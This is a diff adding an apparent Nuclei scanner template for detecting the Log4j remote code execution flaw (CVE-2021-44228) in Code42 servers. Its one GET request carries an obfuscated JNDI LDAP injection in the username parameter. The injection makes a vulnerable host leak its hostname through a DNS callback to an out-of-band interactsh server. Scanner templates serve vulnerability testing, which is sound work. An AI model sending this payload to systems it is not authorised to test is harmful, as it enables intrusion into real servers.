@@ -1,0 +1,64 @@
+id: code42-log4j-rce
+
+info:
+  name: Apache Code42 -  Remote Code Execution (Apache Log4j)
+  author: Adam Crosser
+  severity: critical
+  description: |
+    Multiple Code42 components are impacted by the logj4 vulnerability. Affected Code42 components include:
+    - Code42 cloud: Updated Log4j from 2.15.0 to 2.17.1 on January 26, 2022
+    - Code42 app for Incydr Basic and Advanced and CrashPlan Cloud product plans: Updated Log4j from 2.16.0 to 2.17.1 on January 18, 2022
+    - Code42 User Directory Sync (UDS): Updated Log4j from 2.15.0 to 2.17.1 on February 2, 2022
+    - On-premises Code42 server: Mitigated from Log4j vulnerabilities by following these steps
+    - On-premises Code42 app: Updated to Log4j 2.16 on December 17, 2021
+  reference:
+    - https://support.code42.com/Terms_and_conditions/Code42_customer_support_resources/Code42_response_to_industry_security_incidents
+    - https://logging.apache.org/log4j/2.x/security.html
+    - https://nvd.nist.gov/vuln/detail/CVE-2021-44228
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+    cvss-score: 10
+    cve-id: CVE-2021-44228
+    cwe-id: CWE-77
+  metadata:
+    max-request: 1
+  tags: cve,cve2021,jndi,log4j,rce,oast,code42,kev
+variables:
+  rand1: '{{rand_int(111, 999)}}'
+  rand2: '{{rand_int(111, 999)}}'
+
+http:
+  - method: GET
+    path:
+      - '{{BaseURL}}/c42api/v3/LoginConfiguration?username=${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}/test}&url=https://localhost'
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol # Confirms the DNS Interaction
+        words:
+          - "dns"
+
+      - type: regex
+        part: interactsh_request
+        regex:
+          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'
+
+    extractors:
+      - type: kval
+        kval:
+          - interactsh_ip
+
+      - type: regex
+        part: interactsh_request
+        group: 2
+        regex:
+          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'
+
+      - type: regex
+        part: interactsh_request
+        group: 1
+        regex:
+          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'
+
+# digest: 4b0a00483046022100e8fcf83c4d7903721edacf53a6d056120bc42976ce23e2c53d927f80fc47c0ab02210080b4619783fb413c3f938b0f117a6472e7a94d6e61d56dce4a9c93b79a8aa5f1:922c64590222798bb761d5b6d8e72950
